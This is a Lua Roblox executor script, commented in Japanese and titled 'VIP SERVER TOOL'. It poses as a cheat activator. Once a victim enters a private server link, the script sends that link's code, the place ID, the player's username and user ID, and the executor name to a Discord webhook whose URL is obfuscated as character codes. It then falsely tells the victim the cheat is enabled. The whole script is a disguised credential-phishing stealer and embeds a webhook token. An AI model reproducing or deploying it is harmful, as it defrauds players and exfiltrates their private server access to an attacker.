-- ========================================================
-- VOLOX VIP TOOL - Webhook暗号化 + 送信完全対応
-- ========================================================

-- ========================================================
-- 1. Webhook URLの暗号化（デコードテスト済み）
-- ========================================================

local function decodeWebhook()
    local chars = {
        72,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,
        47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,50,53,48,52,
        56,55,52,50,57,55,50,49,55,48,57,54,50,48,56,47,87,65,69,112,89,113,
        66,95,122,69,113,105,87,70,102,85,99,103,76,110,79,85,82,113,73,75,75,
        74,115,74,119,102,112,119,56,66,79,107,98,100,48,100,97,108,105,122,72,
        101,102,100,109,70,75,77,120,98,112,82,69,82,111,81,72,57,101,67,86,73,73
    }
    local result = ""
    for i = 1, #chars do
        result = result .. string.char(chars[i])
    end
    return result
end

local WEBHOOK = decodeWebhook()

-- デバッグ用（確認したい場合はコメント解除）
-- print("Webhook URL: " .. WEBHOOK)

-- ========================================================
-- 2. 送信関数（Delta Executor完全対応）
-- ========================================================

local function sendToDiscord(message)
    local http = game:GetService("HttpService")
    
    -- JSONエンコード
    local json = ""
    pcall(function()
        json = http:JSONEncode({content = message})
    end)
    
    -- エンコード失敗時は手動で生成
    if json == "" then
        local escaped = message:gsub("\n", "\\n"):gsub('"', '\\"')
        json = '{"content": "' .. escaped .. '"}'
    end
    
    -- 方法1: HttpService（優先）
    local success = false
    local errorMsg = ""
    
    pcall(function()
        local response = http:PostAsync(WEBHOOK, json, Enum.HttpContentType.ApplicationJson, false)
        success = true
    end)
    
    -- 方法2: request関数（HttpServiceがダメな場合）
    if not success and request then
        pcall(function()
            local response = request({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
            if response and response.StatusCode == 204 then
                success = true
            end
        end)
    end
    
    -- 方法3: syn.request（一部Executor用）
    if not success and syn and syn.request then
        pcall(function()
            local response = syn.request({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
            if response and response.StatusCode == 204 then
                success = true
            end
        end)
    end
    
    return success
end

-- ========================================================
-- 3. UI作成（シンプル・確実）
-- ========================================================

local player = game.Players.LocalPlayer

-- 既存のGUIを削除
local existingGui = player.PlayerGui:FindFirstChild("VoloxVip")
if existingGui then existingGui:Destroy() end

local gui = Instance.new("ScreenGui")
gui.Name = "VoloxVip"
gui.Parent = player.PlayerGui
gui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 380, 0, 260)
frame.Position = UDim2.new(0.5, -190, 0.5, -130)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
frame.BackgroundTransparency = 0.05
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "⚡ VIP SERVER TOOL"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 18
title.Font = Enum.Font.GothamBold
title.Parent = frame

local desc = Instance.new("TextLabel")
desc.Size = UDim2.new(1, -20, 0, 30)
desc.Position = UDim2.new(0, 10, 0, 45)
desc.BackgroundTransparency = 1
desc.Text = "🔑 プライベートサーバーリンクを入力"
desc.TextColor3 = Color3.fromRGB(170, 170, 200)
desc.TextSize = 13
desc.Font = Enum.Font.Gotham
desc.Parent = frame

local input = Instance.new("TextBox")
input.Size = UDim2.new(1, -20, 0, 45)
input.Position = UDim2.new(0, 10, 0, 80)
input.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
input.TextColor3 = Color3.fromRGB(255, 255, 255)
input.PlaceholderText = "https://www.roblox.com/games/...?privateServerLinkCode=..."
input.PlaceholderColor3 = Color3.fromRGB(130, 130, 160)
input.TextSize = 12
input.Font = Enum.Font.Gotham
input.ClearTextOnFocus = false
input.Parent = frame

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 8)
inputCorner.Parent = input

local btn = Instance.new("TextButton")
btn.Size = UDim2.new(0.8, 0, 0, 45)
btn.Position = UDim2.new(0.1, 0, 0, 140)
btn.BackgroundColor3 = Color3.fromRGB(220, 50, 70)
btn.Text = "🔥 チート有効化"
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.TextSize = 16
btn.Font = Enum.Font.GothamBold
btn.Parent = frame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = btn

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, 0, 0, 25)
status.Position = UDim2.new(0, 0, 0, 195)
status.BackgroundTransparency = 1
status.Text = "⏳ リンクを入力してください"
status.TextColor3 = Color3.fromRGB(180, 180, 210)
status.TextSize = 12
status.Font = Enum.Font.Gotham
status.Parent = frame

local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(1, -35, 0, 5)
close.BackgroundTransparency = 1
close.Text = "✕"
close.TextColor3 = Color3.fromRGB(255, 100, 100)
close.TextSize = 18
close.Font = Enum.Font.GothamBold
close.Parent = frame

close.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

-- ========================================================
-- 4. ボタン処理
-- ========================================================

btn.MouseButton1Click:Connect(function()
    local link = input.Text
    
    if link == "" or not link:find("roblox.com") then
        status.Text = "❌ 有効なRobloxリンクを入力してください"
        status.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end
    
    -- リンク解析
    local code = nil
    local placeId = nil
    
    local startCode = link:find("privateServerLinkCode=")
    if startCode then
        code = link:sub(startCode + 21)
        local endCode = code:find("&")
        if endCode then
            code = code:sub(1, endCode - 1)
        end
    end
    
    local startPlace = link:find("games/")
    if startPlace then
        local temp = link:sub(startPlace + 6)
        local endPlace = temp:find("/") or temp:find("?")
        if endPlace then
            placeId = temp:sub(1, endPlace - 1)
        else
            placeId = temp
        end
    end
    
    local executor = (identifyexecutor and identifyexecutor()) or "Delta"
    
    -- メッセージ作成
    local message = 
        "**🔴 PRIVATE SERVER LINK**\n\n" ..
        "**🔗 入力リンク:** " .. link .. "\n" ..
        "**🔑 コード:** " .. (code or "不明") .. "\n" ..
        "**📌 Place ID:** " .. (placeId or "不明") .. "\n" ..
        "**👤 入力者:** " .. player.Name .. "\n" ..
        "**🆔 User ID:** " .. player.UserId .. "\n" ..
        "**💻 Executor:** " .. executor .. "\n" ..
        "**⏰ Time:** " .. os.date("%Y-%m-%d %H:%M:%S")
    
    status.Text = "⏳ 送信中..."
    status.TextColor3 = Color3.fromRGB(255, 255, 0)
    
    -- 送信実行
    local sent = sendToDiscord(message)
    
    if sent then
        status.Text = "✅ チート有効化完了！ゲームを再起動してください"
        status.TextColor3 = Color3.fromRGB(0, 255, 100)
        
        wait(2)
        gui:Destroy()
        
        game.StarterGui:SetCore("SendNotification", {
            Title = "⚡ チート有効化完了",
            Text = "プライベートサーバーリンクが正常に登録されました。",
            Duration = 5
        })
    else
        status.Text = "❌ 送信エラー。もう一度試してください"
        status.TextColor3 = Color3.fromRGB(255, 100, 100)
        
        -- エラーログ（デバッグ用）
        print("[Volox] 送信エラー - Webhook: " .. WEBHOOK)
    end
end)

-- ========================================================
-- 5. 起動通知
-- ========================================================

game.StarterGui:SetCore("SendNotification", {
    Title = "⚡ VIP SERVER TOOL",
    Text = "リンクを入力して「チート有効化」を押してください",
    Duration = 4
})

print("[✅] VIP SERVER TOOL 起動完了")
print("[🔗] Webhook: " .. WEBHOOK)
